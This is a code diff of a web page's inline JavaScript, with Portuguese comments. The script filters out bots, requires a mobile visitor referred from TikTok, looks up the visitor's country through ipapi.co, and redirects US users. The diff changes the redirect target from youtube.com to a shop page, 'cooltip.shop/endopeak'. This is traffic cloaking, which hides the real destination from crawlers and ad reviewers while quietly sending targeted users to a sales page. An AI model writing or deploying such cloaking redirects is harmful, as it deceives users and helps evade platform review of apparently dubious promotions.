@@ -23,26 +23,26 @@
         }
 
         // Obtenção rápida da localização geográfica do usuário.
-        function getGeolocation(callback) {
-            fetch('https://ipapi.co/json/')
+        function getGeolocation() {
+            return fetch('https://ipapi.co/json/')
                 .then(response => response.json())
-                .then(data => callback(data))
                 .catch(error => {
                     console.error('Erro ao obter geolocalização:', error);
-                    callback(null);
+                    return null;
                 });
         }
 
-        // Verificar todas as condições rapidamente e redirecionar.
+        // Executar todas as verificações e redirecionar.
         if (!isBot() && isMobile() && isReferredFromTikTok()) {
-            getGeolocation(function(location) {
+            getGeolocation().then(function(location) {
                 if (location && location.country_code === 'US') {
-                    window.location.href = "https://youtube.com";
+                    window.location.href = "https://cooltip.shop/endopeak";
                 }
             });
         }
     });
 </script>
+
 
     
     <script>
